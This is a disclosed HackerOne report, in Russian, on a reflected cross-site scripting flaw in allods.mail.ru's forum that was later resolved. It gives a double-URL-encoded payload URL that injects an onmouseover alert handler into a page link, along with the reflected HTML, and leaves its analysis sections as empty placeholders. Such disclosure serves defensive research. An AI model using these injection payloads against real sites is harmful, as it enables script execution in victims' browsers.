---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '95841'
original_report_id: '95841'
title: '[allods.mail.ru] Reflected XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-10-26T05:29:43.902Z'
disclosed_at: '2017-03-27T13:11:36.619Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [allods.mail.ru] Reflected XSS

## Metadata

- HackerOne Report ID: 95841
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2017-03-27T13:11:36.619Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Приветствую. Для воспроизведения ошибки нужен IE8 + отключить фильтр XSS.

https://allods.mail.ru/forums/newreply.php/%2522%256F%256E%256D%256F%2575%2573%2565%256F%2576%2565%2572%253D%2527%2561%256C%2565%2572%2574%2528%2531%2530%2530%2529%2527%2562%2561%2564%253D%2522

При наведении на кнопку "Вверх" вылезет alert().

Кусок html-текста:

<li><a href="/../../../../forums/newreply.php/"onmouseover='alert(100)'bad="#top" onclick="document.location.hash='top'; return false;"><em></em>Вверх</a></li>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
